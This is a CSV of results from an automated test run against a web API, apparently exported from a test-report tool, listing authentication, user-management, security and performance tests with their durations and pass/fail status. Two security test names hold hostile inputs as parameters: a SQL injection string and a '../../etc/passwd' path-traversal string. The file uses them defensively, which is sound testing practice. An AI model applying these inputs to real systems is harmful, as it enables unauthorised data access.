"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"Test CSRF token validation for state-changing operations.","7602","test_csrf_token_validation","tests","Mon Sep 29 22:47:31 UTC 2025","failed","Mon Sep 29 22:47:39 UTC 2025","TestCSRFProtection","test_users_security","",""
"Test login with missing password returns 400 error.","88","test_login_with_missing_password_returns_error","tests","Mon Sep 29 22:45:48 UTC 2025","passed","Mon Sep 29 22:45:48 UTC 2025","","test_auth_login","",""
"Test connection pool endurance under sustained load.","60438","test_connection_pool_endurance","tests","Mon Sep 29 22:54:51 UTC 2025","passed","Mon Sep 29 22:55:52 UTC 2025","TestEnduranceTesting","test_performance","",""
"Test users list with invalid page parameter.","182","test_get_users_list_invalid_page","tests","Mon Sep 29 22:47:21 UTC 2025","passed","Mon Sep 29 22:47:22 UTC 2025","TestUserRetrieval","test_users_crud","",""
"Test authentication with malformed credentials.","87","test_malformed_credentials[malformed_credentials3]","tests","Mon Sep 29 22:45:48 UTC 2025","passed","Mon Sep 29 22:45:48 UTC 2025","TestAuthenticationEdgeCases","test_auth_login","",""
"Test performance of bulk user operations with rate limiting protection.","3524","test_bulk_user_operations_performance","tests","Mon Sep 29 22:45:51 UTC 2025","failed","Mon Sep 29 22:45:54 UTC 2025","TestUserLoadAndConcurrency","test_performance","",""
"Test retrieving an existing user by ID.","30","test_get_existing_user","tests","Mon Sep 29 22:47:21 UTC 2025","passed","Mon Sep 29 22:47:21 UTC 2025","TestUserRetrieval","test_users_crud","",""
"Test authentication with malformed credentials.","89","test_malformed_credentials[malformed_credentials6]","tests","Mon Sep 29 22:45:48 UTC 2025","passed","Mon Sep 29 22:45:48 UTC 2025","TestAuthenticationEdgeCases","test_auth_login","",""
"Test users list with different page numbers.","36","test_get_users_list_pagination[1]","tests","Mon Sep 29 22:47:21 UTC 2025","passed","Mon Sep 29 22:47:21 UTC 2025","TestUserRetrieval","test_users_crud","",""
"Test API throughput against SLA requirements.","60103","test_throughput_sla_compliance","tests","Mon Sep 29 22:46:49 UTC 2025","passed","Mon Sep 29 22:47:49 UTC 2025","TestSLABenchmarking","test_performance","",""
"Test various update scenarios including edge cases.","107","test_update_user_variations[test_case2]","tests","Mon Sep 29 22:47:22 UTC 2025","failed","Mon Sep 29 22:47:22 UTC 2025","TestUserUpdate","test_users_crud","",""
"Test handling of expired or invalid tokens.","15","test_token_expiration_handling[None]","tests","Mon Sep 29 22:45:48 UTC 2025","passed","Mon Sep 29 22:45:48 UTC 2025","TestTokenExpiration","test_auth_login","",""
"Test that users list responds within acceptable time.","18","test_get_users_list_response_time","tests","Mon Sep 29 22:45:50 UTC 2025","passed","Mon Sep 29 22:45:50 UTC 2025","TestUserResponseTimes","test_performance","",""
"Test SQL injection attempts in user operations.","126","test_sql_injection_in_user_operations[' OR '1'='1]","tests","Mon Sep 29 22:47:23 UTC 2025","passed","Mon Sep 29 22:47:23 UTC 2025","TestInputValidationSecurity","test_users_security","",""
"Test XSS injection attempts in user creation.","28","test_xss_injection_in_user_creation[../../etc/passwd]","tests","Mon Sep 29 22:47:22 UTC 2025","passed","Mon Sep 29 22:47:22 UTC 2025","TestInputValidationSecurity","test_users_security","",""
"Test that memory usage remains stable across multiple operations.","95","test_memory_usage_stability","tests","Mon Sep 29 22:45:54 UTC 2025","skipped","Mon Sep 29 22:45:54 UTC 2025","TestUserMemoryAndResourceUsage","test_performance","",""
"Test handling of expired or invalid tokens.","16","test_token_expiration_handling[]","tests","Mon Sep 29 22:45:48 UTC 2025","passed","Mon Sep 29 22:45:48 UTC 2025","TestTokenExpiration","test_auth_login","",""
